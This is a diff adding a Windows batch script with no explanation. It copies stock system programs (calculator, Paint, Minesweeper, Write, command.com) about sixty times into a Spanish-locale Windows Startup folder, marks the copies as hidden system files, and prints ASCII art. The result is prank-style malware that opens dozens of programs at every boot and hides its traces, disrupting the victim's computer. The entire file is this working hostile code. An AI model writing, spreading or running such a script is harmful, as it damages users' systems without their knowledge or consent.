@@ -1,0 +1,77 @@
+@echo off
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\a.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\b.exe
+copy c:\command.com c:\windows\menúin~1\inicio\c.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\d.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\e.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\f.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\g.exe
+copy c:\command.com c:\windows\menúin~1\inicio\h.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\i.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\j.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\k.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\l.exe
+copy c:\command.com c:\windows\menúin~1\inicio\m.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\n.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\ñ.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\o.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\p.exe
+copy c:\command.com c:\windows\menúin~1\inicio\q.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\r.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\s.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\t.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\u.exe
+copy c:\command.com c:\windows\menúin~1\inicio\v.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\w.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\x.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\y.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\z.exe
+copy c:\command.com c:\windows\menúin~1\inicio\a1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\b1.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\c1.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\d1.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\e1.exe
+copy c:\command.com c:\windows\menúin~1\inicio\f1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\g1.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\h1.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\i1.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\j1.exe
+copy c:\command.com c:\windows\menúin~1\inicio\k1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\l1.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\m1.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\n1.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\o1.exe
+copy c:\command.com c:\windows\menúin~1\inicio\p1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\q1.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\r1.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\s1.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\t1.exe
+copy c:\command.com c:\windows\menúin~1\inicio\u1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\v1.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\w1.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\x1.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\y1.exe
+copy c:\command.com c:\windows\menúin~1\inicio\z1.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\popup.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\lotus.exe
+copy c:\windows\calc.exe c:\windows\menúin~1\inicio\blin.exe
+copy c:\windows\pbrush.exe c:\windows\menúin~1\inicio\1564.exe
+copy c:\command.com c:\windows\menúin~1\inicio\7897.com
+copy c:\windows\winmine.exe c:\windows\menúin~1\inicio\1564.exe
+copy c:\windows\write.exe c:\windows\menúin~1\inicio\159789.exe
+attrib +s +h c:\windows\menúin~1\inicio\*.exe
+attrib +s +h c:\windows\menúin~1\inicio\*.com
+echo           ______      __________
+echo      -   /  ___/     /  ____   /   *  Æ
+echo     -   /  /        /  /   /  /   *  Æ
+echo    -   /  / ___    /  /   /  /   *  Æ
+echo   -   /  /_/  /   /  /___/  /   *  Æ  
+echo  -   /_______/   /_________/   *  Æ
+
+
+
+
+
+
+
+
